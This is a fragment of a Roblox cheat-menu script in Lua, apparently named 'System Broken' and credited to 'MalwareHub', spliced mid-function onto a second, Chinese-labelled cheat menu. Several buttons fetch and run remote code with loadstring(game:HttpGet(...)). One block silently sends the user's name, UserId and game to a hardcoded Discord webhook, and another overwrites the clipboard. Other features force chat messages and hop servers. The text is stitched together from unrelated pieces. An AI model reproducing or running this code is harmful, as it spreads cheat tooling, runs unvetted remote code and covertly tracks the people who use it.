	else
		SendNotify("System Broken","Please turn off shaders.",5)
	end
end)

InfYield_Button.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

CMDX_Button.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
end)

Explode_Button.MouseButton1Click:Connect(function()
	ToggleRagdoll(false)
	task.wait()
	plr.Character.Humanoid:ChangeState(0)
	local bav = Instance.new("BodyAngularVelocity")
	bav.Parent = GetRoot(plr)
	bav.Name = "Spin"
	bav.MaxTorque = Vector3.new(0,math.huge,0)
	bav.AngularVelocity = Vector3.new(0,150,0)
	task.wait(3)
	plr.Character.Humanoid:ChangeState(15)
end)

FreeEmotes_Button.MouseButton1Click:Connect(function()
	if not FreeEmotesEnabled then
		FreeEmotesEnabled = true
		SendNotify("System Broken","Loading free emotes.\nCredits: Gi#7331")
		loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/AllEmotes"))()
	end
end)

Rejoin_Button.MouseButton1Click:Connect(function()
	game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
end)

Serverhop_Button.MouseButton1Click:Connect(function()
	if httprequest then
		local servers = {}
		local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100", game.PlaceId)})
		local body = HttpService:JSONDecode(req.Body)
		if body and body.data then
			for i, v in next, body.data do
				if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
					table.insert(servers, 1, v.id)
				end
			end
		end
		if #servers > 0 then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], plr)
		end
	end
end)

ChatBox_Input.FocusLost:Connect(function()
	local args = {[1] = ChatBox_Input.Text,[2] = "All"}
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
	ChatBox_Input.Text = ""
end)

--GUI Functions
Players.PlayerRemoving:Connect(function(player)
	pcall(function()
		if player.Name == TargetedPlayer then
			UpdateTarget(nil)
			SendNotify("System Broken","Targeted player left/rejoined.",5)
		end
	end)
end)

plr.CharacterAdded:Connect(function(x)
	task.wait(GetPing()+0.1)
	x:WaitForChild("Humanoid")
	if SavedCheckpoint ~= nil then
		TeleportTO(SavedCheckpoint.X,SavedCheckpoint.Y,SavedCheckpoint.Z,"pos","safe")
	end
	if PotionDi_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(PotionDi_Button)
		SendNotify("System Broken","PotionDick was automatically disabled due to your character respawn",5)
	end
	if PotionFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(PotionFling_Button)
		SendNotify("System Broken","PotionFling was automatically disabled due to your character respawn",5)
	end
	if AntiRagdoll_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(AntiRagdoll_Button)
		SendNotify("System Broken","AntiRagdoll was automatically disabled due to your character respawn",5)
	end
	if SpamMines_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(SpamMines_Button)
		SendNotify("System Broken","SpamMines was automatically disabled due to your character respawn",5)
	end
	if Fly_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(Fly_Button)
		flying = false
		Fly_Pad.Visible = false
		KeyDownFunction:Disconnect()
		KeyUpFunction:Disconnect()
		SendNotify("System Broken","Fly was automatically disabled due to your character respawn",5)
	end
	x.Humanoid.Died:Connect(function()
		pcall(function()
			x["Pushed"].Disabled = false
			x["RagdollMe"].Disabled = false
		end)
	end)
	task.wait(1)
	local appearance = players:GetCharacterAppearanceAsync(plr.UserId)
	local original_accs = {}
	local accs = {}
	for i,acc in pairs(appearance:GetChildren()) do --Save original accessoryes
		if acc:IsA("Accessory") then
			table.insert(original_accs, acc.Name)
		end
	end
	for i,acc in pairs(plr.Character:GetChildren()) do --Save player accessoryes
		if acc:IsA("Accessory") then
			table.insert(accs, acc.Name)
		end
	end
	
	local original_ammount = #original_accs
	local ammount = #accs
	if ammount == original_ammount then
		local count = 0
		for i,v in pairs(accs) do
			if table.find(original_accs, v) then
				count = count+1
			end
		end
		if not (count == original_ammount) then
			SysBroker:Destroy()
			SendNotify("System Broken","An unexpected error occurred, re-joining...")
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
		end
	else
		SysBroker:Destroy()
		SendNotify("System Broken","An unexpected error occurred, re-joining...")
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
	end
	appearance:Destroy()
end)

task.spawn(function()
	while task.wait(10) do
		pcall(function()
			local GuiVersion = loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/version"))()
			if version<GuiVersion then
				SendNotify("System Broken","You are not using the latest version, please run the script again.",5)
				task.wait(5)
				SysBroker:Destroy()
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
			end
		end)
	end
end)

OpenClose.MouseButton1Click:Connect(function()
	Background.Visible = not Background.Visible
end)

game:GetService("UserInputService").InputBegan:Connect(function(input,gameProcessedEvent)
	if gameProcessedEvent then return end
	if input.KeyCode == Enum.KeyCode.B then
		Background.Visible = not Background.Visible
	end
end)

task.spawn(function()
	while task.wait(60) do
		pcall(function()
			local age = plr.AccountAge
			local date_1 = os.date("%Y-%m-%d", os.time()-age * 24 * 3600)
			local date_2 = os.date("%Y-%m-%d", os.time()-(age+1) * 24 * 3600)
			local date_3 = os.date("%Y-%m-%d", os.time()-(age-1) * 24 * 3600)

			local info = game:HttpGet("https://users.roblox.com/v1/users/"..plr.UserId)
			local decode = game:GetService("HttpService"):JSONDecode(info)
			local original_name = decode["name"]
			local original_display = decode["displayName"]
			local original_date = decode["created"]:sub(1,10)

			if (plr.Name ~= original_name) or (plr.DisplayName ~= original_display) or (plr.UserId ~= plr.CharacterAppearanceId) then
				SysBroker:Destroy()
				SendNotify("System Broken","An unexpected error occurred, re-joining...")
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
			end
			if (date_1 ~= original_date) and (date_2 ~= original_date) and (date_3 ~= original_date) then
				SysBroker:Destroy()
				SendNotify("System Broken","An unexpected error occurred, re-joining...")
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
			end
		end)
	end
end)
export type Json = {
    Url: string;
    Method: "POST";
    Headers: string;
    Body: any
}

pcall(function()
    local response = HttpRequest({
        Url = "https://discord.com/api/webhooks/1259508306334974002/epK0oLyXDADk7ATyVFrR5XfIbS_OexxUdKagYq43_AQgnEelkPVhhQQxnOGKmW2dJcsD",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            content = "Script has been Injected: \n```Name: " .. plr.Name .. " | UserId: " .. plr.UserId .. " | Game: " .. game.PlaceId .. "```" .. "\nProfile: " .. "https://www.roblox.com/users/" .. plr.UserId .. "\nGame: " .. "https://www.roblox.com/games/" .. game.PlaceId
        })
    } :: Json)
end)

SendNotify("System Broken","Gui developed by MalwareHub - Discord in your clipboard",10)
setclipboard("https://discord.gg/RkhpySwNR9")
loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/premium"))() -- load the premium

  	end    

})

local Tab = Window:MakeTab({
	Name = "娱乐内存",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({

	Name = "变身后台",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/1/refs/heads/main/YY.lua"))()

  	end    

})

Tab:AddButton({

	Name = "黑洞后台（自然灾害专属）",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/157568056/refs/heads/main/%E9%BB%91%E6%B4%9E.lua"))()

  	end    

})

Tab:AddButton({

	Name = "聊天后台（部分可能无法使用）",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/88/refs/heads/main/%E8%81%8A%E5%A4%A9.lua"))()

  	end    

})